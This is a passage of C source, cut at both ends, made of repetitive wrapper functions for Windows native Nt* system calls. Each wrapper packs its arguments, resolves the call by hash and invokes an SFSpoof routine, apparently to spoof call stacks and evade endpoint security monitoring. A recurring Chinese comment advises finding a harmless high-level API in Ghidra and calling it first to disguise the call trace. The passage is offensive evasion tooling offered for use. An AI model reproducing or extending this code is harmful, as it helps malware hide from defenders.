    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x018823522;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtShutdownSystem(SHUTDOWN_ACTION Action) {
    Params.param[1] = (DWORD_PTR)Action;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0A29FA903;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtShutdownWorkerFactory(HANDLE WorkerFactoryHandle, PLONG PendingWorkerCount) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = (DWORD_PTR)PendingWorkerCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x04094742A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSignalAndWaitForSingleObject(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, BOOLEAN bAlertable, PLARGE_INTEGER dwMilliseconds) {
    Params.param[1] = (DWORD_PTR)hObjectToSignal;
    Params.param[2] = (DWORD_PTR)hObjectToWaitOn;
    Params.param[3] = (DWORD_PTR)bAlertable;
    Params.param[4] = (DWORD_PTR)dwMilliseconds;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x02E9D2600;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSinglePhaseReject(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0644042DD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtStartProfile(HANDLE ProfileHandle) {
    Params.param[1] = (DWORD_PTR)ProfileHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00EBCD28A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtStopProfile(HANDLE ProfileHandle) {
    Params.param[1] = (DWORD_PTR)ProfileHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0871C595D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSubscribeWnfStateChange(PCWNF_STATE_NAME StateName, WNF_CHANGE_STAMP ChangeStamp, ULONG EventMask, PLARGE_INTEGER SubscriptionId) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)ChangeStamp;
    Params.param[3] = (DWORD_PTR)EventMask;
    Params.param[4] = (DWORD_PTR)SubscriptionId;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0229B1B46;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSuspendProcess(HANDLE ProcessHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x05D847E28;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)PreviousSuspendCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D3488D72;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSystemDebugControl(DEBUG_CONTROL_CODE Command, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)Command;
    Params.param[2] = (DWORD_PTR)InputBuffer;
    Params.param[3] = (DWORD_PTR)InputBufferLength;
    Params.param[4] = (DWORD_PTR)OutputBuffer;
    Params.param[5] = (DWORD_PTR)OutputBufferLength;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x007D40743;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTerminateEnclave(PVOID BaseAddress, BOOLEAN WaitForThread) {
    Params.param[1] = (DWORD_PTR)BaseAddress;
    Params.param[2] = (DWORD_PTR)WaitForThread;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x02D5A584A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTerminateJobObject(HANDLE JobHandle, NTSTATUS ExitStatus) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)ExitStatus;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0AA49E699;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTestAlert() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0049E0314;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtThawRegistry() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x01C8D263D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtThawTransactions() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x06428BE7E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTraceControl(ULONG FunctionCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)FunctionCode;
    Params.param[2] = (DWORD_PTR)InputBuffer;
    Params.param[3] = (DWORD_PTR)InputBufferLength;
    Params.param[4] = (DWORD_PTR)OutputBuffer;
    Params.param[5] = (DWORD_PTR)OutputBufferLength;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x007906F13;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTranslateFilePath(PFILE_PATH InputFilePath, ULONG OutputType, PFILE_PATH OutputFilePath, PULONG OutputFilePathLength) {
    Params.param[1] = (DWORD_PTR)InputFilePath;
    Params.param[2] = (DWORD_PTR)OutputType;
    Params.param[3] = (DWORD_PTR)OutputFilePath;
    Params.param[4] = (DWORD_PTR)OutputFilePathLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x088D06C9C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUmsThreadYield(PVOID SchedulerParam) {
    Params.param[1] = (DWORD_PTR)SchedulerParam;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0E1BE310A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnloadDriver(PUNICODE_STRING DriverServiceName) {
    Params.param[1] = (DWORD_PTR)DriverServiceName;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x03499263A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnloadKey(POBJECT_ATTRIBUTES DestinationKeyName) {
    Params.param[1] = (DWORD_PTR)DestinationKeyName;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0D8FCAF00;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnloadKey2(POBJECT_ATTRIBUTES TargetKey, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D824240B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnloadKeyEx(POBJECT_ATTRIBUTES TargetKey, HANDLE Event) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0F7FDB938;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnlockFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PULARGE_INTEGER ByteOffset, PULARGE_INTEGER Length, ULONG Key) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)ByteOffset;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)Key;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0BD60ABDD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnlockVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToUnlock, ULONG LockType) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)NumberOfBytesToUnlock;
    Params.param[4] = (DWORD_PTR)LockType;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0171E1391;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnmapViewOfSectionEx(HANDLE ProcessHandle, PVOID BaseAddress, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x05EA5ADDF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnsubscribeWnfStateChange(PCWNF_STATE_NAME StateName) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x062BF2362;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUpdateWnfStateData(PCWNF_STATE_NAME StateName, PVOID Buffer, ULONG Length, PCWNF_TYPE_ID TypeId, PVOID ExplicitScope, WNF_CHANGE_STAMP MatchingChangeStamp, ULONG CheckStamp) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)Buffer;
    Params.param[3] = (DWORD_PTR)Length;
    Params.param[4] = (DWORD_PTR)TypeId;
    Params.param[5] = (DWORD_PTR)ExplicitScope;
    Params.param[6] = (DWORD_PTR)MatchingChangeStamp;
    Params.param[7] = (DWORD_PTR)CheckStamp;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x0DD82F34F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtVdmControl(VDMSERVICECLASS Service, PVOID ServiceData) {
    Params.param[1] = (DWORD_PTR)Service;
    Params.param[2] = (DWORD_PTR)ServiceData;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0379A2D3C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForAlertByThreadId(HANDLE Handle, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)Timeout;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x048B7084A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForDebugEvent(HANDLE DebugObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout, PVOID WaitStateChange) {
    Params.param[1] = (DWORD_PTR)DebugObjectHandle;
    Params.param[2] = (DWORD_PTR)Alertable;
    Params.param[3] = (DWORD_PTR)Timeout;
    Params.param[4] = (DWORD_PTR)WaitStateChange;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0F269CFC8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForKeyedEvent(HANDLE KeyedEventHandle, PVOID Key, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)KeyedEventHandle;
    Params.param[2] = (DWORD_PTR)Key;
    Params.param[3] = (DWORD_PTR)Alertable;
    Params.param[4] = (DWORD_PTR)Timeout;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x078481DD0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForWorkViaWorkerFactory(HANDLE WorkerFactoryHandle, PVOID MiniPacket) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = (DWORD_PTR)MiniPacket;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x04ED96678;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitHighEventPair(HANDLE EventHandle) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x010B0302D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitLowEventPair(HANDLE EventHandle) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x023374A20;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAcquireCMFViewOwnership(BOOLEAN TimeStamp, BOOLEAN TokenTaken, BOOLEAN ReplaceExisting) {
    Params.param[1] = (DWORD_PTR)TimeStamp;
    Params.param[2] = (DWORD_PTR)TokenTaken;
    Params.param[3] = (DWORD_PTR)ReplaceExisting;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x062D6185C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelDeviceWakeupRequest(HANDLE DeviceHandle) {
